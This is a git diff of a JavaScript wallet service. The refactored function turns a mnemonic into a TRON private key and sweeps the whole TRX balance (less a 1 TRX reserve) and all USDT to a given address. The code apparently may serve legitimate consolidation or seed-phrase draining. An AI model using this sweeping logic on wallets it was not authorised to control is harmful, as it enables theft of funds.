@@ -17,6 +17,7 @@ const bitcoin = require("bitcoinjs-lib");
 const bip39 = require("bip39");
 const BIP32Factory = require("bip32").default;
 const ecc = require("tiny-secp256k1");
+const TronWeb = require("tronweb");
 const bip32 = BIP32Factory(ecc);
 const axios = require("axios");
 
@@ -104,6 +105,18 @@ function getTronWebClass() {
   throw new Error(
     "TronWeb constructor not found. Please check tronweb package installation."
   );
+}
+
+async function deriveTronAccountFromMnemonic(mnemonic) {
+  const seed = await bip39.mnemonicToSeed(mnemonic);
+
+  // TronWeb provides this helper internally
+  const account = TronWeb.utils.accounts.generateAccountWithMnemonic(mnemonic);
+
+  return {
+    address: account.address.base58,
+    privateKey: account.privateKey, // already hex, NO 0x
+  };
 }
 
 class WalletBalanceMonitorService {
@@ -990,53 +1003,18 @@ class WalletBalanceMonitorService {
    */
   async sendTronBalances(mnemonic, balances, destinationAddress) {
     try {
-      const TronWebModule = require("tronweb");
-      const TronWeb =
-        typeof TronWebModule === "function"
-          ? TronWebModule
-          : TronWebModule?.default || TronWebModule?.TronWeb;
-
-      if (typeof TronWeb !== "function") {
-        throw new Error("Unable to resolve TronWeb factory");
-      }
-
-      const apiEndpoints = [
-        "https://api.trongrid.io",
-        "https://api.tronstack.io",
-      ];
-
+      // 1. Derive TRON private key from mnemonic (BIP44 / 195)
       const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
       const wallet = hdNode.derivePath("m/44'/195'/0'/0/0");
       const privateKeyHex = wallet.privateKey.replace(/^0x/, "");
 
-      let tronWeb;
-      let lastError;
-
-      for (const endpoint of apiEndpoints) {
-        try {
-          tronWeb = TronWeb({
-            fullHost: endpoint,
-            privateKey: privateKeyHex,
-          });
-
-          if (!tronWeb?.trx || !tronWeb?.address) {
-            throw new Error("Invalid TronWeb instance");
-          }
-
-          break;
-        } catch (err) {
-          lastError = err;
-        }
-      }
-
-      if (!tronWeb) {
-        throw new Error(`Failed to initialize TronWeb: ${lastError?.message}`);
-      }
+      // 2. Initialize TronWeb CORRECTLY (CLASS, NOT FACTORY)
+      const tronWeb = new TronWeb("https://api.trongrid.io", privateKeyHex);
 
       const fromAddress = tronWeb.address.fromPrivateKey(privateKeyHex);
       const results = [];
 
-      /* ================== SEND TRX ================== */
+      /* ===================== SEND TRX ===================== */
 
       const nativeBalance = balances.find(
         (b) => !b.isToken && b.chain === "TRON"
@@ -1045,7 +1023,8 @@ class WalletBalanceMonitorService {
       if (nativeBalance && parseFloat(nativeBalance.balance) > 0) {
         const balanceSun = await tronWeb.trx.getBalance(fromAddress);
 
-        const reserveSun = 1_000_000; // reserve 1 TRX for energy
+        // reserve 1 TRX for energy
+        const reserveSun = 1_000_000;
         const amountToSend = balanceSun - reserveSun;
 
         if (amountToSend > 0) {
@@ -1062,7 +1041,7 @@ class WalletBalanceMonitorService {
         }
       }
 
-      /* ================== SEND TRC20 (USDT) ================== */
+      /* ===================== SEND TRC20 (USDT) ===================== */
 
       const tokenBalances = balances.filter(
         (b) => b.isToken || b.symbol === "USDT"
@@ -1077,15 +1056,9 @@ class WalletBalanceMonitorService {
         }
 
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
         const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        const decimals = Number(
-          await contract
-            .decimals()
-            .call()
-            .catch(() => 6)
-        );
 
+        const decimals = Number(await contract.decimals().call());
         const rawBalance = await contract.balanceOf(fromAddress).call();
 
         if (BigInt(rawBalance) > 0n) {
@@ -1112,7 +1085,6 @@ class WalletBalanceMonitorService {
       throw error;
     }
   }
-
   /**
    * Send Bitcoin balance
    */
